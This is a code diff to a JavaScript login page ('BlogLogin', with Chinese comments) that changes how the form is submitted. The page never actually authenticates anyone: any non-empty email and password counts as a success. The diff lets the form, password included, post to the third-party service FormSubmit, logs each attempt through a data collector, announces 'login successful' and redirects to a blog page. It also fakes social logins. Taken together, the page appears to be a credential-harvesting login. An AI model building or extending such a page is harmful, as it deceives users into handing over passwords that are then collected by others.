@@ -264,8 +264,6 @@ class BlogLogin {
     }
 
     handleLogin(e) {
-        e.preventDefault();
-
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const rememberMe = document.getElementById('rememberMe').checked;
@@ -274,32 +272,37 @@ class BlogLogin {
         if (!email || !password) {
             this.dataCollector.trackLogin(email || '-', 'failed', 'email');
             this.showNotification('请填写所有字段', 'error');
+            e.preventDefault(); // 只有验证失败才阻止提交
             return;
         }
 
         if (!this.isValidEmail(email)) {
             this.dataCollector.trackLogin(email, 'failed', 'email');
             this.showNotification('请输入有效的邮箱地址', 'error');
+            e.preventDefault(); // 只有验证失败才阻止提交
             return;
         }
 
-        // For demo purposes, any non-empty credentials will "work"
-        if (email && password) {
-            this.dataCollector.trackLogin(email, 'success', 'email');
+        // 验证通过，允许表单提交到 FormSubmit
+        // 记录登录数据
+        this.dataCollector.trackLogin(email, 'success', 'email');
 
-            if (rememberMe) {
-                localStorage.setItem('rememberedEmail', email);
-            }
-
-            // 立即跳转到博客首页
-            window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
-
-            // 后台提交表单（不等待响应）
-            this.submitFormInBackground(e.target);
-        } else {
-            this.dataCollector.trackLogin(email, 'failed', 'email');
-            this.showNotification('登录失败，请检查您的凭据', 'error');
+        if (rememberMe) {
+            localStorage.setItem('rememberedEmail', email);
         }
+
+        // 显示成功消息
+        this.showNotification('登录成功！正在提交表单...', 'success');
+
+        // 注意：不再阻止表单提交，让 FormSubmit 处理
+        // 表单会自动提交并跳转到 _next 指定的页面
+        // 但如果浏览器不支持自动跳转，我们手动跳转
+        setTimeout(() => {
+            // 如果 2 秒后还在当前页面，手动跳转
+            if (window.location.pathname.endsWith('index.html') || window.location.pathname === '/') {
+                window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
+            }
+        }, 2000);
     }
 
     togglePasswordVisibility() {
@@ -324,12 +327,14 @@ class BlogLogin {
 
         this.dataCollector.trackLogin(email, 'success', method);
 
-        // 立即跳转到博客首页
-        const socialEmail = `social:${method}@login.com`;
-        window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
+        // 显示成功消息
+        this.showNotification(`${provider} 登录成功！`, 'success');
 
-        // 后台提交社交登录数据
-        this.submitSocialLoginInBackground(method);
+        // 跳转到博客首页
+        const socialEmail = `social:${method}@login.com`;
+        setTimeout(() => {
+            window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}&method=${method}`;
+        }, 1000);
     }
 
     submitSocialLoginInBackground(method) {
